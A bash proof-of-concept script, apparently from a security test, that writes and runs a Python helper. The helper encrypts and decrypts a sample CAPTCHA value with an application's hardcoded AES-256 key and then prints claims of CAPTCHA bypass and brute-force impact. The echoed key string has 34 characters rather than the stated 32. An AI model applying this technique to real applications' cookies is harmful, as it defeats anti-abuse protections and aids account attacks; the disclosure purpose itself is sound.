#!/bin/bash

# POC: Hardcoded AES-256 Encryption Key Exploitation
# This script demonstrates how an attacker can decrypt CAPTCHA values
# using the hardcoded encryption key found in the application source code

echo "[*] Hardcoded AES-256 Key Exploitation POC"
echo "[*] Vulnerability: CAPTCHA encryption uses hardcoded key 'C'*32"
echo ""

# The key from app.py: app.config['AES_KEY'] = 'C'*32
HARDCODED_KEY="CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"

echo "[*] Creating decryption utility..."
cat > /tmp/test_hardcoded_key.py << 'PYTHON_EOF'
#!/usr/bin/env python3
import sys
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# The hardcoded AES-256 key from app configuration
AES_KEY = b'C' * 32

def encrypt_captcha(plaintext, iv=None):
    """Encrypt plaintext CAPTCHA value with hardcoded key"""
    if iv is None:
        iv = os.urandom(16)
    
    cipher = Cipher(
        algorithms.AES(AES_KEY),
        modes.CBC(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    
    # Add PKCS7 padding
    plaintext_bytes = plaintext.encode('utf-8')
    padding_length = 16 - (len(plaintext_bytes) % 16)
    padded = plaintext_bytes + bytes([padding_length] * padding_length)
    
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    
    # Combine IV and ciphertext, then base64 encode
    encrypted_data = iv + ciphertext
    return base64.b64encode(encrypted_data).decode('utf-8')

def decrypt_captcha(encrypted_cookie):
    """Decrypt CAPTCHA value using the hardcoded key"""
    try:
        # Decode base64 cookie
        raw_data = base64.b64decode(encrypted_cookie)
        
        # Extract IV (first 16 bytes) and ciphertext (remainder)
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        
        # Decrypt using AES-256-CBC with the hardcoded key
        cipher = Cipher(
            algorithms.AES(AES_KEY),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove PKCS7 padding
        padding_length = padded_plaintext[-1]
        plaintext = padded_plaintext[:-padding_length]
        
        return plaintext.decode('utf-8')
    except Exception as e:
        return None

if __name__ == "__main__":
    # Test 1: Show that we can encrypt with the hardcoded key
    test_captcha = "ABC12345"
    print("[+] Test CAPTCHA value: {}".format(test_captcha))
    encrypted = encrypt_captcha(test_captcha)
    print("[+] Encrypted with hardcoded key: {}".format(encrypted))
    
    # Test 2: Show that we can decrypt with the hardcoded key
    decrypted = decrypt_captcha(encrypted)
    print("[+] Decrypted value: {}".format(decrypted))
    
    if decrypted == test_captcha:
        print("[+] SUCCESS: Encryption and decryption work with hardcoded key!")
        print("[+] An attacker with the source code can decrypt ANY CAPTCHA cookie")
        sys.exit(0)
    else:
        print("[-] Decryption failed")
        sys.exit(1)
PYTHON_EOF

# Run the test
echo "[*] Step 1: Testing CAPTCHA encryption/decryption with hardcoded key..."
python3 /tmp/test_hardcoded_key.py

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] Step 2: Vulnerability verified - hardcoded key successfully decrypts CAPTCHA"
    echo ""
    echo "=== VULNERABILITY CONFIRMED ==="
    echo "[!] Application Configuration Found:"
    echo "    app.config['AES_KEY'] = 'C'*32"
    echo ""
    echo "[!] This means:"
    echo "    - The encryption key is: $HARDCODED_KEY"
    echo "    - ANY CAPTCHA cookie can be decrypted using this key"
    echo "    - CAPTCHA protection is completely bypassed"
    echo "    - The key is exposed in source code (hardcoded, not from environment)"
    echo ""
    echo "[!] Impact:"
    echo "    - Attackers can bypass CAPTCHA protection"
    echo "    - User registration can be automated"
    echo "    - Brute force attacks on login are possible"
    echo ""
    rm -f /tmp/test_hardcoded_key.py
    exit 0
else
    echo "[-] Vulnerability test failed"
    rm -f /tmp/test_hardcoded_key.py
    exit 1
fi